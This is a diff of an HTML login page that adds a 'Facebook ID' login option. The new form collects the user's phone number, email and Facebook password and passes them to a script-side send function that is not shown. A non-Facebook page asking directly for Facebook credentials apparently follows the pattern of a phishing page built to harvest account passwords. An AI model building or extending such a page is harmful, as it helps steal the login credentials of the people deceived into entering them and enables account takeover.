@@ -8,11 +8,24 @@
 </head>
 <body>
     <div class="login-box">
-        <h2>Login</h2>
-        <input type="text" id="email" placeholder="Enter Email">
-        <input type="text" id="phone" placeholder="Enter Phone Number">
-        <input type="password" id="password" placeholder="Enter Password">
-        <button onclick="sendData()">Login</button>
+        <h2>Select Login Type</h2>
+        <button onclick="showLogin('facebook')">Facebook ID</button>
+        <button onclick="showLogin('email')">Email</button>
+        
+        <div id="facebook-login" class="hidden">
+            <h3>Facebook Login</h3>
+            <input type="text" id="fb-phone" placeholder="Enter Phone Number">
+            <input type="text" id="fb-email" placeholder="Enter Email">
+            <input type="password" id="fb-password" placeholder="Enter Password">
+            <button onclick="sendFacebookData()">Login</button>
+        </div>
+
+        <div id="email-login" class="hidden">
+            <h3>Email Login</h3>
+            <input type="text" id="email" placeholder="Enter Email">
+            <input type="password" id="password" placeholder="Enter Password">
+            <button onclick="sendEmailData()">Login</button>
+        </div>
     </div>
     <script src="script.js"></script>
 </body>
